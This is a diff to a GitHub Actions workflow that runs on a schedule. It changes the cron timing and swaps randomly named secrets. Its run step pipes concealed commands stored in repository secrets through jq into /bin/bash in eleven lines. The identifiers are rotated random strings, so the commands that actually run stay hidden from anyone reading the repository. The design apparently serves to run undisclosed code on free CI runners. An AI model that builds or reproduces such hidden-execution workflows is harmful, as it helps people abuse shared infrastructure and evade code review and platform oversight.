@@ -1,8 +1,10 @@
 name: lijun19871010
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 2/6 * * *'
+    - cron: '58 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,17 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: lijun19871010
         env:
-          qjk17: ${{ secrets.qjk17 }}
+          jxa25: ${{ secrets.jxa25 }}
         run: |
-          echo $qjk17 | jq -r .f70241 | /bin/bash
-          echo $wvqa15187 | jq -r .sii27 | /bin/bash
-          echo $hf5 | jq -r .dcns483 | /bin/bash
-          echo $yi98 | jq -r .ss3 | /bin/bash
-          echo $u3 | jq -r .flu19 | /bin/bash
-          echo $gi9086 | jq -r .mgeb8 | /bin/bash
-          echo $kpfo2 | jq -r .bo99831 | /bin/bash
-          echo $wnlc1 | jq -r .yrm8 | /bin/bash
-          echo $oa7 | jq -r .ah7716 | /bin/bash
-          echo $goh2973 | jq -r .zbfuo04228 | /bin/bash
-          echo $um42 | jq -r .g1297 | /bin/bash
+          echo $jxa25 | jq -r .u055 | /bin/bash
+          echo $c8472 | jq -r .zrx8 | /bin/bash
+          echo $tdg05379 | jq -r .nk246 | /bin/bash
+          echo $fxdjw8 | jq -r .xf6 | /bin/bash
+          echo $qbibg28 | jq -r .ns93352 | /bin/bash
+          echo $bkf524 | jq -r .ztfvy024 | /bin/bash
+          echo $udf868 | jq -r .jkfnu426 | /bin/bash
+          echo $d7573 | jq -r .i9 | /bin/bash
+          echo $ixyjt797 | jq -r .a88 | /bin/bash
+          echo $f5147 | jq -r .ei342 | /bin/bash
+          echo $xq35 | jq -r .eq739 | /bin/bash
 
